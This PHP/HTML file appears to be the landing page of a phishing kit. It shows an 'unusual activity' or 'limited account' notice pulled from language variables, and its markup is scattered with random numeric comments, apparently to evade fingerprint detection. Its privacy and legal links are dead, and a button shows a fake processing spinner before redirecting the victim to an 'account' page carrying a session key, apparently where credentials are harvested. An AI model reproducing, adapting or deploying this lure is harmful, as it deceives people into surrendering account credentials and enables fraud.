<?php
session_start();
require_once '../main.php';
require_once 'session.php';
require_once '../lang.php';
require_once 'compress.php';
ob_start("sanitize_output");
?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge"><!--37648061-->	<link rel="shortcut icon" href="assets/pics/favi.ico">
	<link rel="apple-touch-icon" href="assets/pics/favi.png"><!--21228701-->	<!--29723413--><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
		<title><?php echo $notice['we'];?></title><!--81589195-->	<link rel="stylesheet" href="assets/styles/unusual.css"><!--41704428--></head>
<body>
	<div>
	<!--48249429-->	<div class="centered"><!--22901835-->			<div style="text-align:center"><!--48174537-->	<!--7112813-->			<header>
					<div class="logo"></div><!--82529980-->				</header><!--72529766-->				<div>
					<h1><?php echo $notice['we'];?></h1>
<!--90678678-->
<?php
if($setting['letter'] == 'unusual_activity') {
    echo "<div>";
}elseif($setting['letter'] == 'limited') {
    echo "<div style='text-align:left;'>";
}?>
						<p class="text"><?php echo $notice['weneed'];?></p>
					</div>
				<input type="button" class="button" value="<?php echo $notice['but'];?>" id="btn">
				</div>
				</div>
				<div class="hide" id="rotate"><!--21180039-->					<div class="spinner">
						<div class="rotate"></div>
						<div class="processing"><?php echo $account['proccessing'];?>...</div>
					</div>
			<!--76533515-->			<div class="overlay"></div>
					</div>
				</div><!--55385293-->			</div>
			<footer>
				<ul>
					<li>
						<a href="javascript:"><?php echo $login['privacy'];?></a>
					</li><!--84567727-->					<li><!--73552578-->						<a href="javascript:"><?php echo $login['legal'];?></a>
					</li><!--21531804-->				</ul>
			</footer>
		<script>document.getElementById("btn").onclick=function(){
		document.getElementById("rotate").classList.remove("hide");
	setTimeout(function(){
	window.location.href="account?key=<?php echo $key;?>"},1800)};
		</script>
</body>
</html>
